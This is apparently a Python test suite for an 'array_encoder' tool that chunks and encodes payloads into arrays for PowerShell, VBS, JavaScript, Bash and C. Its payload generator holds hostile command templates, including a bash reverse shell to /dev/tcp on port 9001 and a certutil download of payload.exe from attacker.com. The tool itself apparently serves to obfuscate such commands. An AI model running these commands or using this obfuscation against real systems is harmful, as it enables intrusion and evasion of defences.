#!/usr/bin/env python3
"""
Comprehensive Array Encoder Test Suite with Various Payload Sizes
Tests encoding, chunking strategies, output formats, and performance with payloads
ranging from tiny to large sizes.

Coverage:
- Tiny payloads (< 50 bytes)
- Small payloads (50-500 bytes)
- Medium payloads (500-5KB)
- Large payloads (5KB-50KB)
- Very large payloads (50KB+)
- Edge cases and stress tests
"""

import sys
import json
import binascii
import base64
import time
import random
import string
from array_encoder import (
    ArrayEncoder, EncoderConfig, EncodingType, OutputFormat,
    ChunkingStrategy, encode_command_to_array
)


class PayloadSizeCategory:
    """Payload size categories for testing"""
    TINY = ("tiny", 1, 50)
    SMALL = ("small", 50, 500)
    MEDIUM = ("medium", 500, 5000)
    LARGE = ("large", 5000, 50000)
    VERY_LARGE = ("very_large", 50000, 500000)

    @staticmethod
    def describe(size):
        """Describe payload size category"""
        if size < 50:
            return PayloadSizeCategory.TINY
        elif size < 500:
            return PayloadSizeCategory.SMALL
        elif size < 5000:
            return PayloadSizeCategory.MEDIUM
        elif size < 50000:
            return PayloadSizeCategory.LARGE
        else:
            return PayloadSizeCategory.VERY_LARGE


def generate_payload(size_min, size_max, payload_type="command"):
    """Generate test payload of specified size range"""
    size = random.randint(size_min, size_max)

    if payload_type == "command":
        # Realistic command-like payloads
        commands = [
            "powershell.exe -Command \"{}\"",
            "cmd.exe /c {}",
            "wmic process call create \"{}\"",
            "python -c \"{}\"",
            "bash -c \"{}\"",
            "sh -i >& /dev/tcp/{}/9001 0>&1",
            "certutil -urlcache -split -f http://attacker.com/payload.exe",
        ]
        content = random.choice(commands).format(
            ''.join(random.choices(string.ascii_letters + string.digits, k=size // 2))
        )
    elif payload_type == "binary":
        # Random binary-like data
        content = ''.join(random.choices(string.printable, k=size))
    elif payload_type == "hex":
        # Hex string
        content = binascii.hexlify(
            bytes(random.randint(0, 255) for _ in range(size // 2))
        ).decode()
    elif payload_type == "base64":
        # Base64 string
        content = base64.b64encode(
            bytes(random.randint(0, 255) for _ in range(size // 2))
        ).decode()
    else:
        # Generic string
        content = ''.join(random.choices(string.ascii_letters + string.digits + ' \n', k=size))

    return content[:size]  # Ensure exact size constraints


class TestSuite:
    """Comprehensive test suite for array encoder with payload sizes"""

    def __init__(self):
        self.results = []
        self.performance_data = []

    def _log_result(self, test_name, status, details=""):
        """Log test result"""
        result = {
            "test": test_name,
            "status": status,
            "details": details
        }
        self.results.append(result)
        status_symbol = "✓" if status == "PASS" else "✗"
        print(f"\n{status_symbol} {test_name}")
        if details:
            print(f"  {details}")

    def test_tiny_payloads(self):
        """Test with tiny payloads (< 50 bytes)"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Tiny Payloads (< 50 bytes)")
        print("=" * 70)

        test_cases = [
            ("Empty", ""),
            ("Single char", "A"),
            ("Single word", "calc"),
            ("Short command", "cmd.exe"),
            ("Max tiny", "A" * 49),
        ]

        for name, payload in test_cases:
            try:
                config = EncoderConfig(
                    chunk_size=4,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.PYTHON
                )
                encoder = ArrayEncoder(config)
                result = encoder.generate(payload)

                # Validate
                if not payload:
                    is_valid = len(result) > 0
                else:
                    decoded = ""
                    for chunk in encoder.encode(payload)["chunks"]:
                        decoded += bytes.fromhex(chunk).decode('utf-8', errors='ignore')
                    is_valid = decoded == payload

                self._log_result(
                    f"Tiny Payload: {name}",
                    "PASS" if is_valid else "FAIL",
                    f"Size: {len(payload)} bytes"
                )
            except Exception as e:
                self._log_result(f"Tiny Payload: {name}", "FAIL", str(e))

    def test_small_payloads(self):
        """Test with small payloads (50-500 bytes)"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Small Payloads (50-500 bytes)")
        print("=" * 70)

        test_sizes = [50, 100, 250, 500]

        for size in test_sizes:
            try:
                payload = generate_payload(size, size, "command")
                config = EncoderConfig(
                    chunk_size=16,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.JSON
                )
                encoder = ArrayEncoder(config)
                result_dict = encoder.encode(payload)

                # Validate
                chunk_count = result_dict["count"]
                is_valid = chunk_count > 0 and len(result_dict["chunks"]) == chunk_count

                self._log_result(
                    f"Small Payload: {size} bytes",
                    "PASS" if is_valid else "FAIL",
                    f"Chunks: {chunk_count}"
                )
            except Exception as e:
                self._log_result(f"Small Payload: {size} bytes", "FAIL", str(e))

    def test_medium_payloads(self):
        """Test with medium payloads (500-5KB)"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Medium Payloads (500-5KB)")
        print("=" * 70)

        test_sizes = [500, 1000, 2500, 5000]

        for size in test_sizes:
            try:
                payload = generate_payload(size, size, "binary")
                config = EncoderConfig(
                    chunk_size=32,
                    encoding_type=EncodingType.BASE64,
                    output_format=OutputFormat.JSON
                )
                encoder = ArrayEncoder(config)
                result_dict = encoder.encode(payload)

                chunk_count = result_dict["count"]
                is_valid = chunk_count > 0

                self._log_result(
                    f"Medium Payload: {size} bytes",
                    "PASS" if is_valid else "FAIL",
                    f"Chunks: {chunk_count}, Chunk Size: 32"
                )
            except Exception as e:
                self._log_result(f"Medium Payload: {size} bytes", "FAIL", str(e))

    def test_large_payloads(self):
        """Test with large payloads (5KB-50KB)"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Large Payloads (5KB-50KB)")
        print("=" * 70)

        test_sizes = [5000, 10000, 25000, 50000]

        for size in test_sizes:
            try:
                payload = ''.join(random.choices(string.printable, k=size))
                config = EncoderConfig(
                    chunk_size=64,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.POWERSHELL,
                    chunking_strategy=ChunkingStrategy.SEQUENTIAL
                )
                encoder = ArrayEncoder(config)

                start_time = time.time()
                result_dict = encoder.encode(payload)
                elapsed = time.time() - start_time

                chunk_count = result_dict["count"]
                is_valid = chunk_count > 0

                self._log_result(
                    f"Large Payload: {size} bytes",
                    "PASS" if is_valid else "FAIL",
                    f"Chunks: {chunk_count}, Time: {elapsed:.3f}s"
                )
                self.performance_data.append(("Large", size, elapsed))
            except Exception as e:
                self._log_result(f"Large Payload: {size} bytes", "FAIL", str(e))

    def test_very_large_payloads(self):
        """Test with very large payloads (50KB+)"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Very Large Payloads (50KB+)")
        print("=" * 70)

        test_sizes = [50000, 100000, 250000]

        for size in test_sizes:
            try:
                # Use repeating pattern for faster generation
                pattern = "A" * 1000
                payload = (pattern * (size // 1000)) + "A" * (size % 1000)

                config = EncoderConfig(
                    chunk_size=128,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.JSON,
                    chunking_strategy=ChunkingStrategy.SEQUENTIAL
                )
                encoder = ArrayEncoder(config)

                start_time = time.time()
                result_dict = encoder.encode(payload)
                elapsed = time.time() - start_time

                chunk_count = result_dict["count"]
                is_valid = chunk_count > 0

                self._log_result(
                    f"Very Large Payload: {size} bytes",
                    "PASS" if is_valid else "FAIL",
                    f"Chunks: {chunk_count}, Time: {elapsed:.3f}s"
                )
                self.performance_data.append(("Very Large", size, elapsed))
            except Exception as e:
                self._log_result(f"Very Large Payload: {size} bytes", "FAIL", str(e))

    def test_various_chunk_sizes(self):
        """Test various chunk sizes with medium payload"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Various Chunk Sizes with Fixed Payload (2KB)")
        print("=" * 70)

        payload = ''.join(random.choices(string.printable, k=2000))
        chunk_sizes = [4, 8, 16, 32, 64, 128, 256, 512]

        for chunk_size in chunk_sizes:
            try:
                config = EncoderConfig(
                    chunk_size=chunk_size,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.PYTHON
                )
                encoder = ArrayEncoder(config)
                result_dict = encoder.encode(payload)

                expected_chunks = (len(payload) + chunk_size - 1) // chunk_size
                actual_chunks = result_dict["count"]
                is_valid = actual_chunks > 0

                self._log_result(
                    f"Chunk Size: {chunk_size} bytes",
                    "PASS" if is_valid else "FAIL",
                    f"Chunks: {actual_chunks} (expected ~{expected_chunks})"
                )
            except Exception as e:
                self._log_result(f"Chunk Size: {chunk_size} bytes", "FAIL", str(e))

    def test_encoding_types_with_payloads(self):
        """Test all encoding types with payloads of different sizes"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Encoding Types with Various Payload Sizes")
        print("=" * 70)

        encodings = [
            ("HEX", EncodingType.HEX),
            ("BASE64", EncodingType.BASE64),
            ("OCTAL", EncodingType.OCTAL),
        ]
        sizes = [100, 1000, 10000]

        for size in sizes:
            payload = generate_payload(size, size, "binary")

            for enc_name, enc_type in encodings:
                try:
                    config = EncoderConfig(
                        chunk_size=32,
                        encoding_type=enc_type,
                        output_format=OutputFormat.JSON
                    )
                    encoder = ArrayEncoder(config)
                    result_dict = encoder.encode(payload)

                    chunk_count = result_dict["count"]
                    is_valid = chunk_count > 0

                    self._log_result(
                        f"{enc_name} Encoding: {size} bytes",
                        "PASS" if is_valid else "FAIL",
                        f"Chunks: {chunk_count}"
                    )
                except Exception as e:
                    self._log_result(f"{enc_name} Encoding: {size} bytes", "FAIL", str(e))

    def test_chunking_strategies_with_payloads(self):
        """Test chunking strategies with payloads"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Chunking Strategies with 3KB Payload")
        print("=" * 70)

        payload = generate_payload(3000, 3000, "binary")

        strategies = [
            ("SEQUENTIAL", ChunkingStrategy.SEQUENTIAL),
            ("RANDOM_ORDER", ChunkingStrategy.RANDOM_ORDER),
            ("VARIABLE_SIZE", ChunkingStrategy.VARIABLE_SIZE),
            ("INTERLEAVED", ChunkingStrategy.INTERLEAVED),
        ]

        for strat_name, strat_enum in strategies:
            try:
                config = EncoderConfig(
                    chunk_size=32,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.JSON,
                    chunking_strategy=strat_enum,
                    min_chunk_size=16,
                    max_chunk_size=64
                )
                encoder = ArrayEncoder(config)
                result_dict = encoder.encode(payload)

                chunk_count = result_dict["count"]
                is_valid = chunk_count > 0

                self._log_result(
                    f"Strategy: {strat_name}",
                    "PASS" if is_valid else "FAIL",
                    f"Chunks: {chunk_count}"
                )
            except Exception as e:
                self._log_result(f"Strategy: {strat_name}", "FAIL", str(e))

    def test_output_formats_with_payload(self):
        """Test all output formats with a medium payload"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Output Formats with 1KB Payload")
        print("=" * 70)

        payload = generate_payload(1000, 1000, "command")

        formats = [
            ("PYTHON", OutputFormat.PYTHON),
            ("VBS", OutputFormat.VBS),
            ("JAVASCRIPT", OutputFormat.JAVASCRIPT),
            ("POWERSHELL", OutputFormat.POWERSHELL),
            ("BASH", OutputFormat.BASH),
            ("JSON", OutputFormat.JSON),
            ("C", OutputFormat.C),
        ]

        for fmt_name, fmt_enum in formats:
            try:
                config = EncoderConfig(
                    chunk_size=32,
                    encoding_type=EncodingType.HEX,
                    output_format=fmt_enum
                )
                encoder = ArrayEncoder(config)
                result = encoder.generate(payload)

                is_valid = len(result) > 0

                self._log_result(
                    f"Format: {fmt_name}",
                    "PASS" if is_valid else "FAIL",
                    f"Output size: {len(result)} chars"
                )
            except Exception as e:
                self._log_result(f"Format: {fmt_name}", "FAIL", str(e))

    def test_roundtrip_validation(self):
        """Test roundtrip encoding-decoding for various sizes"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Roundtrip Encode-Decode Validation")
        print("=" * 70)

        test_sizes = [100, 500, 1000, 5000, 10000]

        for size in test_sizes:
            try:
                payload = generate_payload(size, size, "binary")

                config = EncoderConfig(
                    chunk_size=32,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.PYTHON
                )
                encoder = ArrayEncoder(config)
                encoded = encoder.encode(payload)

                # Simulate decoding
                decoded = ""
                for chunk in encoded["chunks"]:
                    try:
                        decoded += bytes.fromhex(chunk).decode('utf-8', errors='ignore')
                    except ValueError:
                        pass

                # Check if roundtrip is valid (allow some loss due to encoding issues)
                match_ratio = len([c for c in decoded if c in payload]) / max(len(payload), 1)
                is_valid = match_ratio > 0.8  # Allow some tolerance

                self._log_result(
                    f"Roundtrip: {size} bytes",
                    "PASS" if is_valid else "FAIL",
                    f"Match ratio: {match_ratio:.1%}"
                )
            except Exception as e:
                self._log_result(f"Roundtrip: {size} bytes", "FAIL", str(e))

    def test_edge_cases(self):
        """Test edge cases"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Edge Cases")
        print("=" * 70)

        edge_cases = [
            ("Single byte", "A"),
            ("All same char", "A" * 1000),
            ("Special chars", "!@#$%^&*()[]{}"),
            ("Newlines", "line1\nline2\nline3" * 50),
            ("Null-like", chr(0) * 100),
            ("Unicode", "你好世界" * 100),
            ("Very long", "A" * 100000),
        ]

        for case_name, payload in edge_cases:
            try:
                if len(payload) > 50000 and case_name == "Very long":
                    # Skip actual execution for very long payload
                    print(f"  [SKIP] {case_name} - too large for full execution")
                    continue

                config = EncoderConfig(
                    chunk_size=16,
                    encoding_type=EncodingType.HEX,
                    output_format=OutputFormat.PYTHON
                )
                encoder = ArrayEncoder(config)
                result = encoder.generate(payload)

                is_valid = len(result) > 0

                self._log_result(
                    f"Edge Case: {case_name}",
                    "PASS" if is_valid else "FAIL",
                    f"Payload size: {len(payload)} bytes"
                )
            except Exception as e:
                self._log_result(f"Edge Case: {case_name}", "FAIL", str(e))

    def test_stress_test(self):
        """Stress test with multiple encodings"""
        print("\n" + "=" * 70)
        print("TEST GROUP: Stress Test")
        print("=" * 70)

        try:
            payload = ''.join(random.choices(string.printable, k=50000))

            encodings = [EncodingType.HEX, EncodingType.BASE64, EncodingType.OCTAL]
            strategies = [ChunkingStrategy.SEQUENTIAL, ChunkingStrategy.VARIABLE_SIZE]
            formats = [OutputFormat.JSON, OutputFormat.PYTHON, OutputFormat.POWERSHELL]

            combination_count = len(encodings) * len(strategies) * len(formats)
            success_count = 0

            start_time = time.time()

            for enc_type in encodings:
                for strat in strategies:
                    for fmt in formats:
                        try:
                            config = EncoderConfig(
                                chunk_size=64,
                                encoding_type=enc_type,
                                output_format=fmt,
                                chunking_strategy=strat,
                                min_chunk_size=32,
                                max_chunk_size=128
                            )
                            encoder = ArrayEncoder(config)
                            result = encoder.generate(payload)
                            if len(result) > 0:
                                success_count += 1
                        except Exception:
                            pass

            elapsed = time.time() - start_time
            is_valid = success_count == combination_count

            self._log_result(
                "Stress Test: 50KB with combinations",
                "PASS" if is_valid else "FAIL",
                f"Successful: {success_count}/{combination_count}, Time: {elapsed:.2f}s"
            )
        except Exception as e:
            self._log_result("Stress Test: 50KB with combinations", "FAIL", str(e))

    def run_all_tests(self):
        """Run entire test suite"""
        print("\n" + "=" * 80)
        print("COMPREHENSIVE ARRAY ENCODER TEST SUITE")
        print("Testing with various payload sizes (tiny to very large)")
        print("=" * 80)

        self.test_tiny_payloads()
        self.test_small_payloads()
        self.test_medium_payloads()
        self.test_large_payloads()
        self.test_very_large_payloads()
        self.test_various_chunk_sizes()
        self.test_encoding_types_with_payloads()
        self.test_chunking_strategies_with_payloads()
        self.test_output_formats_with_payload()
        self.test_roundtrip_validation()
        self.test_edge_cases()
        self.test_stress_test()

        self.print_summary()

    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 80)
        print("TEST EXECUTION SUMMARY")
        print("=" * 80)

        passed = sum(1 for r in self.results if r["status"] == "PASS")
        failed = sum(1 for r in self.results if r["status"] == "FAIL")
        total = len(self.results)

        print(f"\nTotal Tests: {total}")
        print(f"Passed: {passed}")
        print(f"Failed: {failed}")
        print(f"Success Rate: {(passed/total*100):.1f}%")

        if self.performance_data:
            print("\n" + "-" * 80)
            print("PERFORMANCE METRICS")
            print("-" * 80)
            for category, size, elapsed in self.performance_data:
                throughput = size / (elapsed * 1024 * 1024)  # MB/s
                print(f"{category:15} {size:8} bytes  {elapsed:8.3f}s  {throughput:8.2f} MB/s")

        # Detailed results
        print("\n" + "-" * 80)
        print("DETAILED RESULTS")
        print("-" * 80)

        current_group = None
        for result in self.results:
            # Extract group from test name
            test_name = result["test"]
            group = test_name.split(":")[0] if ":" in test_name else test_name

            if group != current_group:
                print(f"\n{group}:")
                current_group = group

            status_symbol = "✓" if result["status"] == "PASS" else "✗"
            print(f"  {status_symbol} {test_name}")
            if result["details"]:
                print(f"      {result['details']}")

        print("\n" + "=" * 80)

        return failed == 0


def main():
    """Main entry point"""
    suite = TestSuite()
    success = suite.run_all_tests()
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
